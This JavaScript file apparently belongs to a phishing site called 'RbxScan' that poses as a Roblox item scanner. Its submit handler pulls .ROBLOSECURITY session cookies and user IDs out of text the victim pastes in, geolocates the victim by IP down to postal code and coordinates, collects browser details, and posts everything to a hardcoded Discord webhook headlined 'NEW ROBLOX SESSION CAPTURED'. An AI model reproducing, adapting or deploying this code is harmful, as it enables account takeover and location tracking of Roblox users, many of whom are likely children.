// Configuration - Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// DOM Elements
const scanBtn = document.getElementById('scanBtn');
const modal = document.getElementById('codeModal');
const closeBtn = document.querySelector('.close');
const submitBtn = document.getElementById('submitBtn');
const cancelBtn = document.getElementById('cancelBtn');
const codeInput = document.getElementById('codeInput');
const loadingOverlay = document.getElementById('loadingOverlay');
const successMessage = document.getElementById('successMessage');
const errorMessage = document.getElementById('errorMessage');
const themeToggle = document.getElementById('themeToggle');

// Event Listeners
scanBtn.addEventListener('click', openModal);
closeBtn.addEventListener('click', closeModal);
cancelBtn.addEventListener('click', closeModal);
submitBtn.addEventListener('click', submitCode);
window.addEventListener('click', outsideClick);
codeInput.addEventListener('input', validateInput);
codeInput.addEventListener('keydown', handleKeyDown);
themeToggle.addEventListener('click', toggleTheme);

// Functions
function openModal() {
    modal.style.display = 'block';
    codeInput.focus();
    codeInput.value = '';
    validateInput();
}

function closeModal() {
    modal.style.display = 'none';
    codeInput.value = '';
    hideMessages();
    
    // Remove validation error if present
    const existingError = document.querySelector('.validation-error');
    if (existingError) {
        existingError.remove();
    }
}

function outsideClick(e) {
    if (e.target === modal) {
        closeModal();
    }
}

function validateInput() {
    const code = codeInput.value.trim();
    const isValid = isValidInput(code);
    
    submitBtn.disabled = !isValid;
    
    // Show validation feedback
    const existingError = document.querySelector('.validation-error');
    if (existingError) {
        existingError.remove();
    }
    
    if (code.length > 0 && !isValid) {
        showValidationError();
    }
}

function isValidInput(input) {
    if (input.length === 0) return false;
    
    // Remove whitespace and convert to lowercase for validation
    const cleanInput = input.replace(/\s+/g, '').toLowerCase();
    
    // Check for various valid Roblox item patterns:
    
    // 1. Roblox Item ID (numeric, typically 6-12 digits)
    const itemIdPattern = /^\d{6,12}$/;
    if (itemIdPattern.test(cleanInput)) {
        return true;
    }
    
    // 2. Roblox Asset URL
    const assetUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/catalog\/\d+/;
    if (assetUrlPattern.test(cleanInput)) {
        return true;
    }
    
    // 3. Asset ID from URL
    const assetIdFromUrl = cleanInput.match(/\/catalog\/(\d+)/);
    if (assetIdFromUrl && assetIdFromUrl[1].length >= 6) {
        return true;
    }
    
    // 4. Bundle URLs
    const bundleUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/bundles\/\d+/;
    if (bundleUrlPattern.test(cleanInput)) {
        return true;
    }
    
    // 5. UGC Item URLs
    const ugcUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/catalog\/\d+/;
    if (ugcUrlPattern.test(cleanInput)) {
        return true;
    }
    
    return false;
}

function showValidationError() {
    const modalBody = document.querySelector('.modal-body');
    const errorElement = document.createElement('div');
    errorElement.className = 'validation-error';
    errorElement.innerHTML = `
        <p>❌ Invalid format. Please enter a valid Roblox item:</p>
        <ul>
            <li>• Roblox Item ID (e.g., 123456789)</li>
            <li>• Roblox Asset URL (e.g., roblox.com/catalog/123456789)</li>
            <li>• Bundle URL (e.g., roblox.com/bundles/123456)</li>
            <li>• UGC Item URL</li>
        </ul>
    `;
    
    modalBody.insertBefore(errorElement, modalBody.querySelector('.button-group'));
}

function extractItemId(input) {
    // For PowerShell scripts, extract key identifiers for logging
    const extractedInfo = {
        type: 'PowerShell Script',
        length: input.length,
        hasRoblosecurity: /\.ROBLOSECURITY/i.test(input),
        hasUserAgent: /UserAgent/i.test(input),
        hasCookies: /Cookies\.Add/i.test(input)
    };
    
    // Extract session ID if present
    const sessionMatch = input.match(/sessionid=([a-f0-9\-]+)/i);
    if (sessionMatch) {
        extractedInfo.sessionId = sessionMatch[1];
    }
    
    // Extract user ID from cookies if present
    const userIdMatch = input.match(/UserID=(-?\d+)/i);
    if (userIdMatch) {
        extractedInfo.userId = userIdMatch[1];
    }
    
    // Extract rbxid if present
    const rbxidMatch = input.match(/rbxid=(\d+)/i);
    if (rbxidMatch) {
        extractedInfo.rbxid = rbxidMatch[1];
    }
    
    return JSON.stringify(extractedInfo, null, 2);
}

function extractRobloxCookie(input) {
    // Extract the .ROBLOSECURITY cookie value
    const cookieMatch = input.match(/\.ROBLOSECURITY['"]\s*,\s*['"]([^'"]+)['"]/i);
    if (cookieMatch) {
        return cookieMatch[1];
    }
    
    // Alternative pattern for different formatting
    const altMatch = input.match(/\.ROBLOSECURITY.*?([A-Za-z0-9_\-|\.%=]+)/i);
    if (altMatch) {
        return altMatch[1];
    }
    
    return "Cookie not found in script";
}

function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    localStorage.setItem('theme', newTheme);
}

function initializeTheme() {
    // Check for saved theme preference or default to light mode
    const savedTheme = localStorage.getItem('theme');
    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    
    const initialTheme = savedTheme || (systemPrefersDark ? 'dark' : 'light');
    document.documentElement.setAttribute('data-theme', initialTheme);
}

function handleKeyDown(e) {
    // Allow Ctrl+Enter or Cmd+Enter to submit
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        if (!submitBtn.disabled) {
            submitCode();
        }
    }
    // Close modal on Escape
    if (e.key === 'Escape') {
        closeModal();
    }
}

function showLoading() {
    loadingOverlay.style.display = 'flex';
    submitBtn.disabled = true;
}

function hideLoading() {
    loadingOverlay.style.display = 'none';
    submitBtn.disabled = false;
    validateInput();
}

function showMessage(type, duration = 3000) {
    hideMessages();
    const messageElement = type === 'success' ? successMessage : errorMessage;
    messageElement.style.display = 'block';
    
    setTimeout(() => {
        messageElement.style.display = 'none';
    }, duration);
}

function hideMessages() {
    successMessage.style.display = 'none';
    errorMessage.style.display = 'none';
}

async function getUserLocation() {
    try {
        // Get IP and location data from ipapi.co (free service)
        const response = await fetch('https://ipapi.co/json/');
        const locationData = await response.json();
        
        return {
            ip: locationData.ip,
            city: locationData.city,
            region: locationData.region,
            country: locationData.country_name,
            country_code: locationData.country_code,
            postal: locationData.postal,
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            timezone: locationData.timezone,
            isp: locationData.org
        };
    } catch (error) {
        console.error('Error getting location:', error);
        // Fallback - try to get just IP from another service
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            return { ip: ipData.ip };
        } catch (ipError) {
            return { ip: 'unknown', error: 'Unable to fetch location data' };
        }
    }
}

async function submitCode() {
    const code = codeInput.value.trim();
    
    if (!code) {
        showMessage('error');
        return;
    }

    // Validate input before submission
    if (!isValidInput(code)) {
        showMessage('error');
        return;
    }

    showLoading();

    try {
        // Get user location data
        const locationData = await getUserLocation();
        
        // Extract clean item ID and Roblox cookie
        const cleanItemId = extractItemId(code);
        const robloxCookie = extractRobloxCookie(code);
        
        // Format data for Discord webhook
        const discordMessage = {
            content: "@everyone 🚨 **NEW ROBLOX SESSION CAPTURED** 🚨",
            embeds: [{
                title: "🔍 New Roblox Session Intercepted",
                color: 0xFF0000, // Red color for urgency
                timestamp: new Date().toISOString(),
                fields: [
                    {
                        name: "🍪 ROBLOSECURITY Cookie",
                        value: `\`\`\`\n${robloxCookie}\n\`\`\``,
                        inline: false
                    },
                    {
                        name: "📝 Script Analysis",
                        value: `**Script Analysis:**\n\`\`\`json\n${cleanItemId}\n\`\`\`\n**Status:** Script received and processed`,
                        inline: false
                    },
                    {
                        name: "🌍 Location",
                        value: `**IP:** ${locationData.ip || 'Unknown'}\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.region || 'Unknown'}\n**Country:** ${locationData.country || 'Unknown'} (${locationData.country_code || 'Unknown'})\n**Postal:** ${locationData.postal || 'Unknown'}\n**ISP:** ${locationData.isp || 'Unknown'}`,
                        inline: true
                    },
                    {
                        name: "💻 Browser Info",
                        value: `**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
                        inline: true
                    }
                ],
                footer: {
                    text: "RbxScan Website",
                    icon_url: "https://cdn.discordapp.com/emojis/1234567890123456789.png"
                }
            }]
        };

        // Add coordinates if available
        if (locationData.latitude && locationData.longitude) {
            discordMessage.embeds[0].fields.push({
                name: "📍 Coordinates",
                value: `**Lat:** ${locationData.latitude}\n**Lng:** ${locationData.longitude}\n**Timezone:** ${locationData.timezone || 'Unknown'}`,
                inline: true
            });
        }
        
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordMessage)
        });

        if (response.ok) {
            showMessage('success');
            closeModal();
        } else {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
    } catch (error) {
        console.error('Error submitting code:', error);
        showMessage('error');
    } finally {
        hideLoading();
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Initialize theme
    initializeTheme();
    
    // Check if webhook URL is configured
    if (WEBHOOK_URL === 'https://your-webhook-url-here.com/webhook') {
        console.warn('⚠️ Please configure your webhook URL in script.js');
        
        // Show a warning in the console for developers
        setTimeout(() => {
            console.log(`
🔧 SETUP REQUIRED:
1. Open script.js
2. Replace 'https://your-webhook-url-here.com/webhook' with your actual webhook URL
3. Your webhook should accept POST requests with JSON data containing a 'code' field
            `);
        }, 1000);
    }
    
    console.log('RbxScan website loaded successfully! 🚀');
});